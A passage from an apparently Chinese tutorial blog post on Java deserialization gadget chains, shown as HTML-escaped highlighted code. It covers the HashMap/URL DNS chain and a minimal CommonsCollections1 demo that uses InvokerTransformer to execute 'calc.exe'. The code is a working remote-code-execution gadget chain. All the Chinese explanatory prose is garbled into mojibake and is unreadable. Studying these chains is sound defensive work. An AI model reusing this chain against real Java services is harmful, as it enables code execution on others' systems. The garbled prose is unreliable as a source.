&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">&lt;/span> &lt;span style="color:#00a8c8">float&lt;/span> &lt;span style="color:#111">lf&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#111">fields&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">get&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#d88200">&amp;#34;loadFactor&amp;#34;&lt;/span>&lt;span style="color:#f92672">,&lt;/span> &lt;span style="color:#111">0&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">75f&lt;/span>&lt;span style="color:#f92672">);&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">if&lt;/span> &lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#111">lf&lt;/span> &lt;span style="color:#f92672">&amp;lt;=&lt;/span> &lt;span style="color:#111">0&lt;/span> &lt;span style="color:#f92672">||&lt;/span> &lt;span style="color:#111">Float&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">isNaN&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#111">lf&lt;/span>&lt;span style="color:#f92672">))&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">throw&lt;/span> &lt;span style="color:#00a8c8">new&lt;/span> &lt;span style="color:#111">InvalidObjectException&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#d88200">&amp;#34;Illegal load factor: &amp;#34;&lt;/span> &lt;span style="color:#f92672">+&lt;/span> &lt;span style="color:#111">lf&lt;/span>&lt;span style="color:#f92672">);&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">lf&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#111">Math&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">min&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#111">Math&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">max&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#111">0&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">25f&lt;/span>&lt;span style="color:#f92672">,&lt;/span> &lt;span style="color:#111">lf&lt;/span>&lt;span style="color:#f92672">),&lt;/span> &lt;span style="color:#111">4&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">0f&lt;/span>&lt;span style="color:#f92672">);&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">HashMap&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">UnsafeHolder&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">putLoadFactor&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#00a8c8">this&lt;/span>&lt;span style="color:#f92672">,&lt;/span> &lt;span style="color:#111">lf&lt;/span>&lt;span style="color:#f92672">);&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">reinitialize&lt;/span>&lt;span style="color:#f92672">();&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">s&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">readInt&lt;/span>&lt;span style="color:#f92672">();&lt;/span> &lt;span style="color:#75715e">// Read and ignore number of buckets
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">&lt;/span> &lt;span style="color:#00a8c8">int&lt;/span> &lt;span style="color:#111">mappings&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#111">s&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">readInt&lt;/span>&lt;span style="color:#f92672">();&lt;/span> &lt;span style="color:#75715e">// Read number of mappings (size)
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">&lt;/span> &lt;span style="color:#00a8c8">if&lt;/span> &lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#111">mappings&lt;/span> &lt;span style="color:#f92672">&amp;lt;&lt;/span> &lt;span style="color:#111">0&lt;/span>&lt;span style="color:#f92672">)&lt;/span> &lt;span style="color:#f92672">{&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">throw&lt;/span> &lt;span style="color:#00a8c8">new&lt;/span> &lt;span style="color:#111">InvalidObjectException&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#d88200">&amp;#34;Illegal mappings count: &amp;#34;&lt;/span> &lt;span style="color:#f92672">+&lt;/span> &lt;span style="color:#111">mappings&lt;/span>&lt;span style="color:#f92672">);&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#f92672">}&lt;/span> &lt;span style="color:#00a8c8">else&lt;/span> &lt;span style="color:#00a8c8">if&lt;/span> &lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#111">mappings&lt;/span> &lt;span style="color:#f92672">==&lt;/span> &lt;span style="color:#111">0&lt;/span>&lt;span style="color:#f92672">)&lt;/span> &lt;span style="color:#f92672">{&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#75715e">// use defaults
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">&lt;/span> &lt;span style="color:#f92672">}&lt;/span> &lt;span style="color:#00a8c8">else&lt;/span> &lt;span style="color:#00a8c8">if&lt;/span> &lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#111">mappings&lt;/span> &lt;span style="color:#f92672">&amp;gt;&lt;/span> &lt;span style="color:#111">0&lt;/span>&lt;span style="color:#f92672">)&lt;/span> &lt;span style="color:#f92672">{&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">float&lt;/span> &lt;span style="color:#111">fc&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#00a8c8">float&lt;/span>&lt;span style="color:#f92672">)&lt;/span>&lt;span style="color:#111">mappings&lt;/span> &lt;span style="color:#f92672">/&lt;/span> &lt;span style="color:#111">lf&lt;/span> &lt;span style="color:#f92672">+&lt;/span> &lt;span style="color:#111">1&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">0f&lt;/span>&lt;span style="color:#f92672">;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">int&lt;/span> &lt;span style="color:#111">cap&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#f92672">((&lt;/span>&lt;span style="color:#111">fc&lt;/span> &lt;span style="color:#f92672">&amp;lt;&lt;/span> &lt;span style="color:#111">DEFAULT_INITIAL_CAPACITY&lt;/span>&lt;span style="color:#f92672">)&lt;/span> &lt;span style="color:#f92672">?&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">DEFAULT_INITIAL_CAPACITY&lt;/span> &lt;span style="color:#f92672">:&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#111">fc&lt;/span> &lt;span style="color:#f92672">&amp;gt;=&lt;/span> &lt;span style="color:#111">MAXIMUM_CAPACITY&lt;/span>&lt;span style="color:#f92672">)&lt;/span> &lt;span style="color:#f92672">?&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">MAXIMUM_CAPACITY&lt;/span> &lt;span style="color:#f92672">:&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">tableSizeFor&lt;/span>&lt;span style="color:#f92672">((&lt;/span>&lt;span style="color:#00a8c8">int&lt;/span>&lt;span style="color:#f92672">)&lt;/span>&lt;span style="color:#111">fc&lt;/span>&lt;span style="color:#f92672">));&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">float&lt;/span> &lt;span style="color:#111">ft&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#00a8c8">float&lt;/span>&lt;span style="color:#f92672">)&lt;/span>&lt;span style="color:#111">cap&lt;/span> &lt;span style="color:#f92672">*&lt;/span> &lt;span style="color:#111">lf&lt;/span>&lt;span style="color:#f92672">;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">threshold&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#f92672">((&lt;/span>&lt;span style="color:#111">cap&lt;/span> &lt;span style="color:#f92672">&amp;lt;&lt;/span> &lt;span style="color:#111">MAXIMUM_CAPACITY&lt;/span> &lt;span style="color:#f92672">&amp;amp;&amp;amp;&lt;/span> &lt;span style="color:#111">ft&lt;/span> &lt;span style="color:#f92672">&amp;lt;&lt;/span> &lt;span style="color:#111">MAXIMUM_CAPACITY&lt;/span>&lt;span style="color:#f92672">)&lt;/span> &lt;span style="color:#f92672">?&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#00a8c8">int&lt;/span>&lt;span style="color:#f92672">)&lt;/span>&lt;span style="color:#111">ft&lt;/span> &lt;span style="color:#f92672">:&lt;/span> &lt;span style="color:#111">Integer&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">MAX_VALUE&lt;/span>&lt;span style="color:#f92672">);&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#75715e">// Check Map.Entry[].class since it&amp;#39;s the nearest public type to
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">&lt;/span> &lt;span style="color:#75715e">// what we&amp;#39;re actually creating.
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">&lt;/span> &lt;span style="color:#111">SharedSecrets&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">getJavaOISAccess&lt;/span>&lt;span style="color:#f92672">().&lt;/span>&lt;span style="color:#75af00">checkArray&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#111">s&lt;/span>&lt;span style="color:#f92672">,&lt;/span> &lt;span style="color:#111">Map&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">Entry&lt;/span>&lt;span style="color:#f92672">[].&lt;/span>&lt;span style="color:#75af00">class&lt;/span>&lt;span style="color:#f92672">,&lt;/span> &lt;span style="color:#111">cap&lt;/span>&lt;span style="color:#f92672">);&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#75af00">@SuppressWarnings&lt;/span>&lt;span style="color:#f92672">({&lt;/span>&lt;span style="color:#d88200">&amp;#34;rawtypes&amp;#34;&lt;/span>&lt;span style="color:#f92672">,&lt;/span>&lt;span style="color:#d88200">&amp;#34;unchecked&amp;#34;&lt;/span>&lt;span style="color:#f92672">})&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">Node&lt;/span>&lt;span style="color:#f92672">&amp;lt;&lt;/span>&lt;span style="color:#111">K&lt;/span>&lt;span style="color:#f92672">,&lt;/span>&lt;span style="color:#111">V&lt;/span>&lt;span style="color:#f92672">&amp;gt;[]&lt;/span> &lt;span style="color:#111">tab&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#111">Node&lt;/span>&lt;span style="color:#f92672">&amp;lt;&lt;/span>&lt;span style="color:#111">K&lt;/span>&lt;span style="color:#f92672">,&lt;/span>&lt;span style="color:#111">V&lt;/span>&lt;span style="color:#f92672">&amp;gt;[])&lt;/span>&lt;span style="color:#00a8c8">new&lt;/span> &lt;span style="color:#111">Node&lt;/span>&lt;span style="color:#f92672">[&lt;/span>&lt;span style="color:#111">cap&lt;/span>&lt;span style="color:#f92672">];&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">table&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#111">tab&lt;/span>&lt;span style="color:#f92672">;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#75715e">// Read the keys and values, and put the mappings in the HashMap
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">&lt;/span> &lt;span style="color:#00a8c8">for&lt;/span> &lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#00a8c8">int&lt;/span> &lt;span style="color:#111">i&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#111">0&lt;/span>&lt;span style="color:#f92672">;&lt;/span> &lt;span style="color:#111">i&lt;/span> &lt;span style="color:#f92672">&amp;lt;&lt;/span> &lt;span style="color:#111">mappings&lt;/span>&lt;span style="color:#f92672">;&lt;/span> &lt;span style="color:#111">i&lt;/span>&lt;span style="color:#f92672">++)&lt;/span> &lt;span style="color:#f92672">{&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#75af00">@SuppressWarnings&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#d88200">&amp;#34;unchecked&amp;#34;&lt;/span>&lt;span style="color:#f92672">)&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">K&lt;/span> &lt;span style="color:#111">key&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#111">K&lt;/span>&lt;span style="color:#f92672">)&lt;/span> &lt;span style="color:#111">s&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">readObject&lt;/span>&lt;span style="color:#f92672">();&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#75af00">@SuppressWarnings&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#d88200">&amp;#34;unchecked&amp;#34;&lt;/span>&lt;span style="color:#f92672">)&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">V&lt;/span> &lt;span style="color:#111">value&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#111">V&lt;/span>&lt;span style="color:#f92672">)&lt;/span> &lt;span style="color:#111">s&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">readObject&lt;/span>&lt;span style="color:#f92672">();&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">putVal&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#111">hash&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#111">key&lt;/span>&lt;span style="color:#f92672">),&lt;/span> &lt;span style="color:#111">key&lt;/span>&lt;span style="color:#f92672">,&lt;/span> &lt;span style="color:#111">value&lt;/span>&lt;span style="color:#f92672">,&lt;/span> &lt;span style="color:#00a8c8">false&lt;/span>&lt;span style="color:#f92672">,&lt;/span> &lt;span style="color:#00a8c8">false&lt;/span>&lt;span style="color:#f92672">);&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#f92672">}&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#f92672">}&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#f92672">}&lt;/span>
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;p>è¿™æ˜¯å®ƒé‡å†™çš„&lt;code>readObject&lt;/code>æ–¹æ³•ï¼Œåœ¨æœ€åä¸€è¡Œå¯¹keyè®¡ç®—hashå€¼ï¼Œä¼šè§¦å‘hashCodeæ–¹æ³•ï¼Œè€Œè®¡ç®—hashCodeæ—¶ä¼šè§¦å‘DNSçš„è¯·æ±‚&lt;/p>
&lt;p>æ„é€ é“¾å­æ—¶æˆ‘ä»¬éœ€è¦åˆå§‹åŒ–ä¸€ä¸ª&lt;code>java.net.URL&lt;/code>å¯¹è±¡ä½œä¸ºHashMapçš„keyï¼Œä¹‹åå°†è¿™ä¸ªå¯¹è±¡çš„hashCodeè®¾ä¸º-1ï¼Œå¼ºåˆ¶åœ¨ååºåˆ—åŒ–æ—¶é‡æ–°è®¡ç®—hashCodeï¼Œè§¦å‘åç»­è°ƒç”¨&lt;/p>
&lt;p>å¦å¤–åœ¨ysoserialçš„payloadç”Ÿæˆæ—¶ä¸ºäº†é˜²æ­¢æ‰§è¡ŒDNSè¯·æ±‚ï¼Œä½¿ç”¨äº†&lt;code>SilentURLStreamHandler&lt;/code>&lt;/p>
&lt;h2 id="cc18u71">CC1(&amp;lt;8u71&lt;/h2>
&lt;p>åœ¨pç‰›çš„javaå®‰å…¨æ¼«è°ˆä¸­ç»™å‡ºäº†CC1çš„æç®€ç‰ˆdemo&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-java" data-lang="java">&lt;span style="display:flex;">&lt;span>&lt;span style="color:#00a8c8">public&lt;/span> &lt;span style="color:#00a8c8">class&lt;/span> &lt;span style="color:#75af00">testCC1&lt;/span> &lt;span style="color:#f92672">{&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">public&lt;/span> &lt;span style="color:#00a8c8">static&lt;/span> &lt;span style="color:#00a8c8">void&lt;/span> &lt;span style="color:#75af00">main&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#111">String&lt;/span>&lt;span style="color:#f92672">[]&lt;/span> &lt;span style="color:#111">args&lt;/span>&lt;span style="color:#f92672">)&lt;/span> &lt;span style="color:#00a8c8">throws&lt;/span> &lt;span style="color:#111">Exception&lt;/span>&lt;span style="color:#f92672">{&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">Transformer&lt;/span>&lt;span style="color:#f92672">[]&lt;/span> &lt;span style="color:#111">transformers&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#00a8c8">new&lt;/span> &lt;span style="color:#111">Transformer&lt;/span>&lt;span style="color:#f92672">[]{&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">new&lt;/span> &lt;span style="color:#111">ConstantTransformer&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#111">Runtime&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">getRuntime&lt;/span>&lt;span style="color:#f92672">()),&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">new&lt;/span> &lt;span style="color:#111">InvokerTransformer&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#d88200">&amp;#34;exec&amp;#34;&lt;/span>&lt;span style="color:#f92672">,&lt;/span> &lt;span style="color:#00a8c8">new&lt;/span> &lt;span style="color:#111">Class&lt;/span>&lt;span style="color:#f92672">[]{&lt;/span>&lt;span style="color:#111">String&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">class&lt;/span>&lt;span style="color:#f92672">},&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">new&lt;/span> &lt;span style="color:#111">Object&lt;/span>&lt;span style="color:#f92672">[]{&lt;/span>&lt;span style="color:#d88200">&amp;#34;calc.exe&amp;#34;&lt;/span>&lt;span style="color:#f92672">}),&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#f92672">};&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">Transformer&lt;/span> &lt;span style="color:#111">transformerChain&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#00a8c8">new&lt;/span> &lt;span style="color:#111">ChainedTransformer&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#111">transformers&lt;/span>&lt;span style="color:#f92672">);&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">Map&lt;/span> &lt;span style="color:#111">innerMap&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#00a8c8">new&lt;/span> &lt;span style="color:#111">HashMap&lt;/span>&lt;span style="color:#f92672">();&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">Map&lt;/span> &lt;span style="color:#111">outerMap&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#111">TransformedMap&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">decorate&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#111">innerMap&lt;/span>&lt;span style="color:#f92672">,&lt;/span> &lt;span style="color:#00a8c8">null&lt;/span>&lt;span style="color:#f92672">,&lt;/span> &lt;span style="color:#111">transformerChain&lt;/span>&lt;span style="color:#f92672">);&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">outerMap&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">put&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#d88200">&amp;#34;test&amp;#34;&lt;/span>&lt;span style="color:#f92672">,&lt;/span> &lt;span style="color:#d88200">&amp;#34;amiz&amp;#34;&lt;/span>&lt;span style="color:#f92672">);&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#f92672">}&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#f92672">}&lt;/span>
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;h3 id="å‰ç½®">å‰ç½®&lt;/h3>
&lt;p>é¦–å…ˆç†è§£ä¸€ä¸‹æ²¡è§è¿‡çš„å‡ ä¸ªå‡½æ•°&lt;/p>
&lt;ul>
&lt;li>&lt;code>Transformer&lt;/code>&lt;/li>
&lt;/ul>
&lt;p>ä¸€ä¸ªæ¥å£ï¼Œåªæœ‰ä¸€ä¸ªå¾…å®ç°çš„transformæ–¹æ³•&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-java" data-lang="java">&lt;span style="display:flex;">&lt;span>&lt;span style="color:#00a8c8">public&lt;/span> &lt;span style="color:#00a8c8">interface&lt;/span> &lt;span style="color:#75af00">Transformer&lt;/span>&lt;span style="color:#f92672">{&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">public&lt;/span> &lt;span style="color:#111">Object&lt;/span> &lt;span style="color:#75af00">transform&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#111">Object&lt;/span> &lt;span style="color:#111">input&lt;/span>&lt;span style="color:#f92672">);&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#f92672">}&lt;/span>
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;ul>
&lt;li>&lt;code>TransformedMap&lt;/code>&lt;/li>
&lt;/ul>
&lt;p>TransformedMapå¯¹innerMapä½œäº†ä¿®é¥°ï¼Œä¼ å‡ºçš„outerMapæ˜¯ä¿®é¥°åçš„M&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-java" data-lang="java">&lt;span style="display:flex;">&lt;span>&lt;span style="color:#111">Map&lt;/span> &lt;span style="color:#111">outerMap&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#111">TransformedMap&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">decorate&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#111">innerMap&lt;/span>&lt;span style="color:#f92672">,&lt;/span> &lt;span style="color:#111">KeyTransformer&lt;/span>&lt;span style="color:#f92672">,&lt;/span> &lt;span style="color:#111">valueTransformer&lt;/span>&lt;span style="color:#f92672">);&lt;/span>
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;p>keyTransformeræ˜¯å¤„ç†æ–°å…ƒç´ keyçš„å›è°ƒï¼ŒvalueTransformeræ˜¯å¤„ç†æ–°å…ƒç´ valueçš„å›è°ƒï¼›è¿™é‡Œçš„å›è°ƒå¹¶ä¸æ˜¯å›è°ƒå‡½æ•° è€Œæ˜¯ä¸€ä¸ªå®ç°äº†ä¸Šé¢Transformeræ¥å£çš„ç±»&lt;/p>
&lt;ul>
&lt;li>&lt;code>ConstantTransformer&lt;/code>&lt;/li>
&lt;/ul>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-java" data-lang="java">&lt;span style="display:flex;">&lt;span>&lt;span style="color:#00a8c8">public&lt;/span> &lt;span style="color:#75af00">ConstantTransformer&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#111">Object&lt;/span> &lt;span style="color:#111">constantToReturn&lt;/span>&lt;span style="color:#f92672">){&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">super&lt;/span>&lt;span style="color:#f92672">();&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">iConstant&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#111">constantToReturn&lt;/span>&lt;span style="color:#f92672">;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#f92672">}&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#00a8c8">public&lt;/span> &lt;span style="color:#111">Object&lt;/span> &lt;span style="color:#75af00">transform&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#111">Object&lt;/span> &lt;span style="color:#111">input&lt;/span>&lt;span style="color:#f92672">){&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">return&lt;/span> &lt;span style="color:#111">iConstant&lt;/span>&lt;span style="color:#f92672">;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#f92672">}&lt;/span>
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;p>æ˜¯ä¸€ä¸ªå®ç°äº†Transformeræ¥å£çš„ç±»ï¼Œå®ƒçš„è¿‡ç¨‹ç±»ä¼¼æ„é€ å‡½æ•°æ—¶ä¼ å…¥ä¸€ä¸ªå¯¹è±¡ï¼Œåœ¨transformæ–¹æ³•ä¸­å°†è¿™ä¸ªå¯¹è±¡è¿”å›ï¼Œä½œç”¨æ˜¯åŒ…è£…ä»»æ„ä¸€ä¸ªå¯¹è±¡ï¼Œåœ¨æ‰§è¡Œå›è°ƒæ—¶è¿”å›è¿™ä¸ªå¯¹è±¡ï¼Œæ–¹ä¾¿åç»­æ“ä½œ&lt;/p>
&lt;ul>
&lt;li>&lt;code>InvokerTransformer&lt;/code>&lt;/li>
&lt;/ul>
&lt;p>ä¹Ÿæ˜¯ä¸€ä¸ªå®ç°äº†Transformeræ¥å£çš„ç±»ï¼Œç±»å¯ä»¥ç”¨æ¥æ‰§è¡Œä»»æ„æ–¹æ³•ï¼Œè¿™ä¹Ÿæ˜¯ååºåˆ—åŒ–èƒ½RCEçš„å…³é”®&lt;/p>
